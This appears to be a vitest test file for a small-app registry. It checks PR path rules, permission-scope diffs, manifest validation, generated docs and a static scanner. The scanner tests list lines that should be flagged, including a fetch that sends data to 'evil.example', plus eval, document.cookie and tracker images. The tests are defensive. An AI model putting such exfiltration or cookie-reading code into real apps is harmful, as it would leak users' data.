import { describe, expect, it } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { checkPaths } from "../../scripts/check-pr-paths";
import { diffManifests } from "../../scripts/scope-diff";
import { scanText } from "../../scripts/scan-simple-apps";
import { collectApps } from "../../scripts/build-registry";
import { buildDocs, apiTypesText } from "../../scripts/build-docs";

describe("path guard", () => {
  it("accepts a PR touching one app (+ its full-app route)", () => {
    expect(checkPaths(["apps/laundry/app.json", "apps/laundry/src/app.tsx", "src/app/a/laundry/page.tsx"], []).ok).toBe(true);
  });
  it("rejects core files without the core label, accepts with it", () => {
    const files = ["apps/x-app/app.json", "src/platform/server/engine.ts"];
    const r = checkPaths(files, []);
    expect(r.ok).toBe(false);
    expect(r.coreFiles).toEqual(["src/platform/server/engine.ts"]);
    expect(checkPaths(files, ["core"]).ok).toBe(true);
  });
  it("treats apps/tags.json and CI files as core", () => {
    expect(checkPaths(["apps/tags.json"], []).ok).toBe(false);
    expect(checkPaths([".github/workflows/ci.yml"], []).ok).toBe(false);
  });
  it("rejects two apps in one PR", () => {
    const r = checkPaths(["apps/aaa/app.json", "apps/bbb/app.json"], []);
    expect(r.ok).toBe(false);
    expect(r.apps.sort()).toEqual(["aaa", "bbb"]);
  });
});

describe("scope diff", () => {
  it("flags sensitive scopes and widened rules", () => {
    const base = { a: { scopes: ["unit"], collections: { c: { read: "own", create: "commander" } } } };
    const head = { a: { scopes: ["unit", "contact"], collections: { c: { read: "company", create: "any" } } } };
    const r = diffManifests(base, head);
    expect(r.needsApproval).toBe(true);
    expect(r.lines.join("\n")).toMatch(/contact/);
    expect(r.lines.join("\n")).toMatch(/read widened own → company/);
    expect(r.lines.join("\n")).toMatch(/create widened commander → any/);
  });
  it("narrowing or unchanged needs no approval", () => {
    const base = { a: { scopes: ["push"], collections: { c: { read: "all", create: "any" } } } };
    const head = { a: { scopes: ["push"], collections: { c: { read: "own", create: "admin" } } } };
    expect(diffManifests(base, head).needsApproval).toBe(false);
  });
  it("new app with push and a shared collection needs approval", () => {
    const r = diffManifests({}, { n: { scopes: ["push"], collections: { b: { read: "platoon", create: "any" } } } });
    expect(r.needsApproval).toBe(true);
  });
});

describe("static scan", () => {
  const bad = [
    '<script src="https://cdn.example.com/x.js"></script>',
    '<script src="//cdn.example.com/x.js"></script>',
    '<link rel="stylesheet" href="https://fonts.googleapis.com/css">',
    "fetch('https://evil.example/collect?d=' + x)",
    "const r = new XMLHttpRequest()",
    "new WebSocket('wss://x')",
    "eval(code)",
    "new Function('a', 'return a')",
    "setTimeout('alert(1)', 10)",
    "localStorage.setItem('x', 1)",
    "document.cookie",
    '<iframe src="/x"></iframe>',
    "body { background: url(https://x/y.png) }",
    "top.location = '/x'",
    '<img src="https://tracker.example/p.gif">',
  ];
  for (const line of bad) it(`flags: ${line.slice(0, 50)}`, () => expect(scanText("f", line).length).toBeGreaterThan(0));
  const good = ['<script src="/bahad.js"></script>', '<link rel="stylesheet" href="/bahad.css">', "fetch('data.json')", "await bahad.data.collection('x').list()", '<img src="icon.png">'];
  for (const line of good) it(`allows: ${line.slice(0, 50)}`, () => expect(scanText("f", line)).toEqual([]));
});

describe("registry validation", () => {
  function fixture(apps: Record<string, Record<string, string>>) {
    const root = mkdtempSync(path.join(tmpdir(), "bahad-reg-"));
    mkdirSync(path.join(root, "apps"), { recursive: true });
    writeFileSync(path.join(root, "apps/tags.json"), JSON.stringify({ tags: ["כלים"] }));
    for (const [slug, files] of Object.entries(apps)) {
      for (const [f, content] of Object.entries(files)) {
        const p = path.join(root, f.startsWith("src/") ? f : path.join("apps", slug, f));
        mkdirSync(path.dirname(p), { recursive: true });
        writeFileSync(p, content);
      }
    }
    return root;
  }
  const svg = '<svg xmlns="http://www.w3.org/2000/svg"></svg>';
  const man = (o: object) => JSON.stringify({ slug: "good-app", name: "א", description: "ב", tier: "simple", icon: "icon.svg", tags: ["כלים"], authors: ["me"], status: "live", version: "1.0.0", ...o });

  it("accepts a valid simple app", async () => {
    const root = fixture({ "good-app": { "app.json": man({}), "icon.svg": svg, "site/index.html": "<html></html>" } });
    const r = await collectApps([path.join(root, "apps")], root);
    expect(r.errors).toEqual([]);
    expect(r.apps[0].effectiveScopes).toEqual(["profile"]);
  });
  it("reports every rule violation", async () => {
    const root = fixture({
      "bad-app": { "app.json": man({ slug: "other", tags: ["nope"], scope: ["x"] }), "icon.svg": "not svg" },
      "full-app": { "app.json": man({ slug: "full-app", tier: "full" }), "icon.svg": svg, "site/index.html": "x" },
      "nojson": { "readme.md": "x" },
      "badjson": { "app.json": "{", "icon.svg": svg },
      "schema-app": {
        "app.json": man({ slug: "schema-app", collections: { c: { read: "own", create: "any", schema: { type: "nope" } } } }),
        "icon.svg": svg,
        "site/index.html": "x",
      },
      "orphan": { "src/app/a/orphan-route/page.tsx": "x" },
    });
    const r = await collectApps([path.join(root, "apps")], root);
    const all = r.errors.join("\n");
    expect(all).toMatch(/bad-app: app.json \(root\): Unrecognized key/);
    expect(all).toMatch(/full-app: full app needs src\/app\/a\/full-app\/page.tsx/);
    expect(all).toMatch(/full-app: full app must not have a site\/ folder/);
    expect(all).toMatch(/nojson: missing app.json/);
    expect(all).toMatch(/badjson: app.json is not valid JSON/);
    expect(all).toMatch(/schema-app: collections.c.schema is not a valid JSON Schema/);
    expect(all).toMatch(/src\/app\/a\/orphan-route: no app with this slug/);
  });
  it("checks slug = folder, tags, icon, data-scope consistency", async () => {
    const root = fixture({
      "wrong-slug": { "app.json": man({ slug: "different" }), "icon.svg": svg, "site/index.html": "x" },
      "bad-tag": { "app.json": man({ slug: "bad-tag", tags: ["לא קיים"] }), "icon.svg": svg, "site/index.html": "x" },
      "no-icon": { "app.json": man({ slug: "no-icon" }), "site/index.html": "x" },
      "data-empty": { "app.json": man({ slug: "data-empty", scopes: ["data"] }), "icon.svg": svg, "site/index.html": "x" },
      "png-small": { "app.json": man({ slug: "png-small", icon: "i.png" }), "i.png": "\x89PNG\r\n\x1a\n" + "\0".repeat(16), "site/index.html": "x" },
    });
    const all = (await collectApps([path.join(root, "apps")], root)).errors.join("\n");
    expect(all).toMatch(/wrong-slug: slug "different" must equal the folder name/);
    expect(all).toMatch(/bad-tag: unknown tag/);
    expect(all).toMatch(/no-icon: icon "icon.svg" not found/);
    expect(all).toMatch(/data-empty: app.json scopes: scope "data" needs/);
    expect(all).toMatch(/png-small: icon "i.png"/);
  });
  it("the real apps folder is valid", async () => {
    const root = path.resolve(__dirname, "../..");
    const r = await collectApps([path.join(root, "apps")], root);
    expect(r.errors).toEqual([]);
    expect(r.apps.map((a) => a.slug)).toContain("laundry");
  });
});

describe("generated docs", () => {
  it("expands every placeholder and keeps each starter prompt in ONE code block", async () => {
    const pages = await buildDocs();
    for (const p of pages) expect(p.markdown, p.slug).not.toMatch(/\{\{[A-Z_]+\}\}/);
    const starter = pages.find((p) => p.slug === "starter-prompt")!;
    const pres = starter.html.match(/<pre>[\s\S]*?<\/pre>/g) ?? [];
    expect(pres.length).toBe(2);
    for (const pre of pres) {
      expect(pre).toMatch(/Now ask me what app I want to build\./);
      expect(pre).toMatch(/bahad\.user\.me\(\)/);
      expect(pre).toMatch(/&quot;\$schema&quot;/);
    }
  });
  it("bahad.d.ts is the API types without exports", async () => {
    const t = await apiTypesText();
    expect(t).not.toMatch(/^export /m);
    expect(t).toMatch(/interface Bahad \{/);
  });
});
